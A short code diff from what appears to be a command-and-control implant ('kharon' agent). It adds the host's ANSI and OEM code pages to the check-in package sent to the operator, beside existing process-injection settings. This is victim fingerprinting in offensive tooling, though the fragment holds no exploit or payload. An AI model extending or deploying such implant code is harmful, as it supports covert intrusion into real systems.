@@ -29,6 +29,9 @@ auto DECLFN Transport::Checkin(
     // custom agent storage for kharon config
     //
 
+    Self->Pkg->Int32( CheckinPkg, Self->Krnl32.GetACP() );
+    Self->Pkg->Int32( CheckinPkg, Self->Krnl32.GetOEMCP() );
+
     // injection behavior
     Self->Pkg->Int32( CheckinPkg, Self->Inj->Ctx.Alloc );
     Self->Pkg->Int32( CheckinPkg, Self->Inj->Ctx.Write );
